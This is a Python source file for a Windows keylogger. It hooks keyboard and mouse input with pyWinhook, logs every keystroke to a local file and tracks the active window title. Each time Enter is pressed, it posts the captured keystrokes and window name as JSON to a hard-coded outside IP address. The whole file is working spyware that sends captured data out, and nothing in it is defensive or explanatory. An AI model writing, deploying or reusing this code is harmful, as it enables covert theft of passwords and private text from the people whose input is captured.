import os
import logging
import requests
from datetime import datetime

import pythoncom
import pyWinhook as hook
import win32gui

# Payload
payload = {"created_at": None,
           "windows_name": None,
           "keystrokes": None}
keystrokes = ""
prev_window_title = ""
curr_window_title = ""

# Configure the logger
LOG_KEYSTROKES = os.path.join(os.getcwd(), 'keylog.txt')
logging.basicConfig(filename=LOG_KEYSTROKES, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Configure request endpoint
URL = "http://35.197.159.20:8080/api/v1/text"

def send_keystrokes_payload(keystrokes, window):
    global URL
    global payload
    
    # Create payload
    payload["created_at"] = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    payload["keystrokes"] = keystrokes
    payload["windows_name"] = window
    print("Sent a request:\n", payload, end='\n\n')
    
    # Send POST request
    requests.post(URL, json=payload)
    
    # Reset payload
    payload = payload.fromkeys(payload, None)


# Mouse event listener
def on_mouse_click(event):
    global prev_window_title
    global curr_window_title
    
    # Log mouse event
    if event.MessageName != "mouse move":
        print('Mouse event:', event.MessageName, event.Position)
    
    # Get the window info
    window_handle = win32gui.WindowFromPoint(event.Position)
    curr_window_title = win32gui.GetWindowText(window_handle)
    
    # When there is a change in window
    if curr_window_title != prev_window_title:
        print("Cursor in window:", curr_window_title)
        prev_window_title = curr_window_title
        
    return True

# Keyboard even listener
def on_keyboard_event(event):
    
    global keystrokes
    
    # DEFINE ASCII VALUES
    TAB = 9
    ENTER = 13
    
    # Add keystroke to payload
    keypress = event.Ascii
    logging.info('Key: %s' % chr(keypress))
    
    if keypress == ENTER:  # Send request with payload
        print("SENT:\n", keystrokes)
        send_keystrokes_payload(keystrokes, curr_window_title)
        keystrokes = ""
    
    elif keypress == TAB:  # Move to next line
        keystrokes += "\n"
        
    else:
        keystrokes += chr(keypress)

    return True

# Create the hook manager and register the event handler
hm = hook.HookManager()
hm.KeyDown = on_keyboard_event
hm.MouseAll = on_mouse_click
hm.HookKeyboard()
hm.HookMouse()

# Start the event loop
pythoncom.PumpMessages()